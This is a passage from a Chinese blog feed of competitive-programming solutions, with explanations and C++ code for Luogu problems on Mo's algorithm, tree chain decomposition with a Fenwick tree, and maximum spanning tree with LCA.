和所有的2^(r-l+1-k)。这里安利一个神奇的方式：每次查询只需要做一次时间复杂度为sqrt(n)的预处理就可以O(1)查询了。<br>假设查询区间长度为len(len&#x3D;r-l+1)，我们记siz&#x3D;sqrt(len)，而后计算2^0 , 2^1 , 2^2 … 2^sqrt(len)，存在数组pow1中；再计算2^sqrt(len) , 2^(2*sqrt(len)) , 2^(3*sqrt(len)) , 2^(4*sqrt(len))… , 2^(sqrt(len)*sqrt(len))，存在数组pow[2]中。以上计算都在mod p意义下进行。<br>这样求2的任意次方都可以O(1)出解:2^k &#x3D;2^(k&#x2F;siz) *2^(k%siz)&#x3D;pow2[k&#x2F;siz]*pow1[k%siz]（记得模p）。</p><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 100005 </span></span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> a[MAXN],val[MAXN*<span class="number">2</span>],cnt[MAXN],ans[MAXN];</span><br><span class="line"><span class="type">int</span> tot,blosiz,powsiz;</span><br><span class="line"><span class="type">int</span> bel[MAXN],pow1[MAXN],pow2[MAXN];</span><br><span class="line"><span class="type">bool</span> calced[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> sum[MAXN];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">query</span> &#123;</span><br><span class="line"><span class="type">int</span> id,l,r,p;</span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt;(<span class="type">const</span> query &amp;sb) <span class="type">const</span> &#123;</span><br><span class="line"><span class="keyword">return</span> bel[l]!=bel[sb.l] ? bel[l]&lt;bel[sb.l] : (bel[l]&amp;<span class="number">1</span> ? r&lt;sb.r : r&gt;sb.r);</span><br><span class="line">&#125;</span><br><span class="line">&#125; q[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">sum[cnt[x]]-=x;</span><br><span class="line">cnt[x]++;</span><br><span class="line">sum[cnt[x]]+=x;</span><br><span class="line">++tot;</span><br><span class="line">val[tot]=cnt[x];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">del</span><span class="params">(<span class="type">int</span> x)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">sum[cnt[x]]-=x;</span><br><span class="line">cnt[x]--;</span><br><span class="line">sum[cnt[x]]+=x;</span><br><span class="line">++tot;</span><br><span class="line">val[tot]=cnt[x];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">power</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1LL</span>*pow1[x%powsiz]*pow2[x/powsiz]%p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">blosiz=<span class="built_in">sqrt</span>(n);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]),bel[i]=(i<span class="number">-1</span>)/blosiz;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++) </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;q[i].l,&amp;q[i].r,&amp;q[i].p),q[i].id=i;</span><br><span class="line"><span class="built_in">sort</span>(q+<span class="number">1</span>,q+m+<span class="number">1</span>);</span><br><span class="line"><span class="type">int</span> l=<span class="number">1</span>,r=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (l&gt;q[i].l) <span class="built_in">add</span>(a[--l]);</span><br><span class="line">        <span class="keyword">while</span> (r&lt;q[i].r) <span class="built_in">add</span>(a[++r]);</span><br><span class="line">        <span class="keyword">while</span> (l&lt;q[i].l) <span class="built_in">del</span>(a[l++]);</span><br><span class="line">        <span class="keyword">while</span> (r&gt;q[i].r) <span class="built_in">del</span>(a[r--]);</span><br><span class="line">        </span><br><span class="line"><span class="type">int</span> newtot=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> len=r-l+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=tot;j++) </span><br><span class="line"><span class="keyword">if</span> (val[j]&amp;&amp;sum[val[j]]!=<span class="number">0</span>&amp;&amp;!calced[val[j]]) </span><br><span class="line">calced[val[j]]=<span class="number">1</span>,val[++newtot]=val[j];</span><br><span class="line">tot=newtot;</span><br><span class="line"></span><br><span class="line">powsiz=<span class="built_in">sqrt</span>(len)+<span class="number">1</span>;</span><br><span class="line">pow1[<span class="number">0</span>]=pow2[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=powsiz;j++) </span><br><span class="line">pow1[j]=(pow1[j<span class="number">-1</span>]+pow1[j<span class="number">-1</span>])%q[i].p;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j*powsiz&lt;=len;j++) </span><br><span class="line">pow2[j]=<span class="number">1LL</span>*pow2[j<span class="number">-1</span>]*pow1[powsiz]%q[i].p;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> powLen=<span class="built_in">power</span>(len,q[i].p);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=tot;j++) &#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> num=sum[val[j]]%q[i].p;</span><br><span class="line">ans[q[i].id]=(ans[q[i].id]+num*(powLen-<span class="built_in">power</span>(len-val[j],q[i].p)))%q[i].p;</span><br><span class="line">calced[val[j]]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">ans[q[i].id]+=q[i].p;</span><br><span class="line">ans[q[i].id]%=q[i].p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++) </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分块 </tag>
            
            <tag> 哈希 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P3950 部落冲突</title>
      <link href="/2018/10/28/%E6%B4%9B%E8%B0%B7P3950%20%E9%83%A8%E8%90%BD%E5%86%B2%E7%AA%81/"/>
      <url>/2018/10/28/%E6%B4%9B%E8%B0%B7P3950%20%E9%83%A8%E8%90%BD%E5%86%B2%E7%AA%81/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href="https://www.luogu.org/problemnew/show/P3950">https://www.luogu.org/problemnew/show/P3950</a>  </p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>给定一棵树，每次给定一个操作，有如下两种：  </p><ol><li>将某条边染黑<br>2.询问给定的u,v两点间是否有边被染黑</li></ol><hr><p>###思路<br>询问两点间是否有边被染黑只需要在求LCA时判一下就行。所以直接上树链剖分即可。<br>本题不需要使用线段树，使用树状数组查询路径上是否有任意一段区间和不为0即可。</p><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lowbit(x) x&amp;-x</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; P;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1000000</span>;</span><br><span class="line">P war[maxn];</span><br><span class="line"><span class="type">int</span> fa[maxn], dep[maxn], val[maxn], sz[maxn], top[maxn], son[maxn];</span><br><span class="line"><span class="type">int</span> tre[maxn];</span><br><span class="line"><span class="type">int</span> tot;</span><br><span class="line"><span class="type">int</span> cntw;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ch, x = <span class="number">0</span>, f = <span class="number">1</span>;ch = <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>((ch &lt; <span class="string">&#x27;0&#x27;</span> || ch &gt; <span class="string">&#x27;9&#x27;</span>) &amp;&amp; ch != <span class="string">&#x27;-&#x27;</span>) ch = <span class="built_in">getchar</span>();</span><br><span class="line">    ch == <span class="string">&#x27;-&#x27;</span> ? f = <span class="number">-1</span>, ch = <span class="built_in">getchar</span>() : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(ch &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        x = x * <span class="number">10</span> + ch - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch = <span class="built_in">getchar</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f * x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    <span class="type">int</span> to, len, nxt;</span><br><span class="line">    <span class="built_in">Edge</span>() &#123;&#125;</span><br><span class="line">    <span class="built_in">Edge</span>(<span class="type">int</span> _to, <span class="type">int</span> _len, <span class="type">int</span> _nxt):<span class="built_in">to</span>(_to), <span class="built_in">len</span>(_len), <span class="built_in">nxt</span>(_nxt) &#123;&#125;</span><br><span class="line">&#125;E[maxn];</span><br><span class="line"><span class="type">int</span> h[maxn], cnte;</span><br><span class="line"><span class="type">int</span> L[maxn], R[maxn];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> add)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = x;i &lt;= maxn; i += <span class="built_in">lowbit</span>(i)) tre[i] += add;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>; <span class="keyword">for</span>(<span class="type">int</span> i = x; i; i -= <span class="built_in">lowbit</span>(i)) ans += tre[i]; <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">add_edge</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> v, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    E[++cnte] = <span class="built_in">Edge</span>(v, w, h[u]), h[u] = cnte;</span><br><span class="line">    E[++cnte] = <span class="built_in">Edge</span>(u, w, h[v]), h[v] = cnte;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs1</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    sz[x] = <span class="number">1</span>; dep[x] = dep[fa[x]] + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = h[x]; i; i = E[i].nxt) &#123;</span><br><span class="line">        <span class="type">int</span> to = E[i].to;</span><br><span class="line">        <span class="keyword">if</span>(to == fa[x]) <span class="keyword">continue</span>;</span><br><span class="line">        fa[to] = x;val[x] = E[i].len;</span><br><span class="line">        <span class="built_in">dfs1</span>(to);</span><br><span class="line">        sz[x] += sz[to];</span><br><span class="line">        <span class="keyword">if</span>(sz[to] &gt; sz[son[x]]) son[x] = to;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs2</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    L[x] = ++tot;</span><br><span class="line">    <span class="keyword">if</span>(x == son[fa[x]]) top[x] = top[fa[x]];</span><br><span class="line">    <span class="keyword">else</span> top[x] = x;</span><br><span class="line">    <span class="keyword">if</span>(son[x]) <span class="built_in">dfs2</span>(son[x]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = h[x]; i; i = E[i].nxt) &#123;</span><br><span class="line">        <span class="type">int</span> to = E[i].to;</span><br><span class="line">        <span class="keyword">if</span>(to == fa[x] || to == son[x]) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">dfs2</span>(to);</span><br><span class="line">    &#125;</span><br><span class="line">    R[x] = tot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cut</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L[x] &lt; L[y]) <span class="built_in">swap</span>(x, y);</span><br><span class="line">    <span class="built_in">update</span>(L[x], <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">connect</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L[x] &lt; L[y]) <span class="built_in">swap</span>(x, y);</span><br><span class="line">    <span class="built_in">update</span>(L[x], <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">qsum</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;<span class="comment">//其实可以查到有1就退出，不用查完和</span></span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(top[x] != top[y])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(dep[top[x]] &lt; dep[top[y]])<span class="built_in">swap</span>(x, y);</span><br><span class="line">        ans += (<span class="built_in">query</span>(L[x]) - <span class="built_in">query</span>(L[top[x]] - <span class="number">1</span>));</span><br><span class="line">        x = fa[top[x]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(dep[x] &lt; dep[y])<span class="built_in">swap</span>(x, y);</span><br><span class="line">    <span class="keyword">if</span> (x!=y)</span><br><span class="line">ans += (<span class="built_in">query</span>(L[x]) - <span class="built_in">query</span>(L[y]));</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) <span class="built_in">add_edge</span>(<span class="built_in">read</span>(), <span class="built_in">read</span>(), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">dfs1</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">dfs2</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="type">char</span> s[<span class="number">50</span>];</span><br><span class="line">        cin &gt;&gt; s;</span><br><span class="line">        <span class="keyword">if</span>(s[<span class="number">0</span>] == <span class="string">&#x27;C&#x27;</span>) &#123;</span><br><span class="line">            <span class="type">int</span> u = <span class="built_in">read</span>(), v = <span class="built_in">read</span>();</span><br><span class="line">            <span class="built_in">cut</span>(u, v);</span><br><span class="line">            war[++cntw] = <span class="built_in">P</span>(u, v);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(s[<span class="number">0</span>] == <span class="string">&#x27;U&#x27;</span>) &#123;</span><br><span class="line">            <span class="type">int</span> w = <span class="built_in">read</span>();</span><br><span class="line">            <span class="built_in">connect</span>(war[w].first, war[w].second);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">qsum</span>(<span class="built_in">read</span>(), <span class="built_in">read</span>()) != <span class="number">0</span>) <span class="built_in">puts</span>(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;Yes&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数链剖分 </tag>
            
            <tag> 树状数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P1967 货车运输</title>
      <link href="/2018/09/28/%E6%B4%9B%E8%B0%B7P1967%20%E8%B4%A7%E8%BD%A6%E8%BF%90%E8%BE%93/"/>
      <url>/2018/09/28/%E6%B4%9B%E8%B0%B7P1967%20%E8%B4%A7%E8%BD%A6%E8%BF%90%E8%BE%93/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href>https://www.luogu.org/problemnew/show/P1902</a>  </p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>给定一个n个点m条边的无向带权图，每次询问2点u,v的联通情况，不联通则输出-1。<br>如果联通，不妨将一条联通u,v的路径上的最小权值记为w，则该次询问输出所有可能的w中的最大值。<br>共有q次询问。</p><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>对于任意两点u&amp;v，我们需要找出能使得w最大的一条最优路径。<br>因此需要生成一个新图，使得原图中联通<strong>任意两点之间只存在一条</strong>能使得w最大的最优路径。<br>因此这是一棵树……<br>又因为要使w最大，应尽量选择边权大的边作为路径……  然后就突然发觉：这不就是Kruskal算法的过程吗？只不过最小生成树优先选择边权小的边，此时优先选择边权大的。<br>因此要求的新图就是一颗<strong>最大生成树</strong>……Kruskal可破。<br>然后就是求任意两点LCA了。此处使用倍增，也方便维护某节点向树根爬的时候路上的最小权值。<br>（用树链剖分+线段树维护也行…………）<br>更具体的看代码注释。</p><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inf 1000000005</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> u,v,w;<span class="comment">//两点u&amp;v以及边权</span></span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> Node &amp;b) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> w&lt;b.w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">vector &lt;Node&gt; e[<span class="number">50005</span>];<span class="comment">//e[u]储存节点u相连的边集。</span></span><br><span class="line">priority_queue &lt;Node&gt; Q;<span class="comment">//边权越大的优先级越高</span></span><br><span class="line"><span class="type">int</span> fa[<span class="number">50005</span>];<span class="comment">//Kruskal的御用并查集，fa[u]代表u点所处集合</span></span><br><span class="line"><span class="type">bool</span> vis[<span class="number">50005</span>];<span class="comment">//是否已经被dfs过程访问过</span></span><br><span class="line"><span class="type">int</span> fas[<span class="number">50005</span>][<span class="number">21</span>],minw[<span class="number">50005</span>][<span class="number">21</span>],deep[<span class="number">50005</span>];</span><br><span class="line"><span class="comment">//fas[u][j]代表u点在所处树中的第2^j级父亲编号</span></span><br><span class="line"><span class="comment">//minw[u][j]代表u点在所处树中至第2^j级父亲的路径上最小边权</span></span><br><span class="line"><span class="comment">//deep[u]代表u点在所处树中深度</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span><span class="comment">//查找x所在集合编号</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x==fa[x]) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> fa[x]=<span class="built_in">find</span>(fa[x]);<span class="comment">//路径压缩</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">uni</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span> <span class="comment">//合并a,b所在集合</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fa[<span class="built_in">find</span>(a)]=<span class="built_in">find</span>(b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> v,<span class="type">int</span> w)</span> <span class="comment">//添加新图边</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node one;</span><br><span class="line">    one.u=u;</span><br><span class="line">    one.v=v;</span><br><span class="line">    one.w=w;</span><br><span class="line">    e[u].<span class="built_in">push_back</span>(one);</span><br><span class="line">    <span class="built_in">uni</span>(u,v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> f,<span class="type">int</span> k)</span><span class="comment">//dfs，u代表当前点，f为当前点父亲，k为深度</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vis[u]=<span 